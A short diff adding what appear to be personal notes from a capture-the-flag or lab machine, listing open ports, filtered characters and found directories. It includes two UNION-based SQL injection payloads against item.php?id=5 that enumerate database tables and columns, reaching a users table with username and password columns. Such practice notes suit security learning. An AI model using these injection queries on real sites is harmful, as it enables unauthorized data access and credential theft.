@@ -1,0 +1,18 @@
+no other ports except ssh an web.
+filtered characters or strings are(from item.php?id=5): 
+
+' # DROP - username @ ----
+
+interesting dirs are:
+shop.php,item.php, /delete,/assets,/requests.txt
+some text hints at default passwords 
+"New priv esc for Ubunut??"
+
+"Change MySQL password on main system!"
+to get the tables in the current database, we used:
+?id=5 UNION SELECT 1,group_concat(table_name),3,4,5 from information_schema.tables where table_schema=database()
+(two tables in db park, items and users)
+
+to get the columns in 
+id=5 UNION SELECT 1,group_concat(column_name),3,4,5 from information_schema.columns where table_schema=database()
+all columns are id,package,price,information,sold,id,username,password 
